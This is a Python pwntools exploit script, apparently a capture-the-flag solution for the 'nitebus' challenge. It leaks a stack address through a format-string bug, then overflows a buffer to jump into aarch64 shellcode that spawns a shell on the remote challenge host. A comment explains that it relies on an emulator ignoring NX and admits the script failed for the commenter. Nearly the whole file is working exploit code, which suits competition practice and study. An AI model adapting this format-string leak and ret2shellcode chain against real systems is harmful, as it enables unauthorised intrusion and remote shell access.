#!/usr/bin/env python3

from pwn import *

exe = ELF("./nitebus")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
                b * upload_control_program
                b * 0x4007e0
                c
            """)
    else:
        r = remote("nitebus.chals.nitectf25.live", 1337, ssl=True)

    return r


def main():
    r = conn()

    # Bus 1 -> format string to leak stack pointer
    bus1 = flat(
        b"\x01",
        b"\x08",
        b"A" * 2,
        b"%3$p"
    )

    r.sendafter(b"Waiting for nitebus packet...\n", bus1)
    r.recvuntil(b"[DIAGNOSTICS] ")
    stack_leak = int(r.recv(14), 16)
    our_input = stack_leak + 336
    print(hex(stack_leak), hex(our_input))

    # Author of this solution: Abdelhameed Ghazy (on discord)
    # MyNote: For some reason there are emulators ignore NX protections so
    #         they permit the execution of shellcode in the memory area
    #         allocated as stack for the emulated program. So this unintended
    #         simply jumps to the shellcode (without any ROP chain) and, thanks
    #         to this bug (?) it magically executes it although NX is enabled.
    #         This script doesn't work for me but I can reproduce the same
    #         behaviour on my original solve and validate this solution easily.

    # ret 2 shellcode with nx ? hmmmmmmm
    sc = asm(shellcraft.aarch64.sh())
    payload = flat(
        sc,
        b"A" * (152-len(sc)),
        p64(our_input)
    )

    # Bus 2 -> overflow
    bus2 = flat(
        b"\x01",
        b"\x42",
        0xff
    )
    r.sendafter(b"Waiting for nitebus packet...\n", bus2)
    r.sendafter(b"Enter program data: ", payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
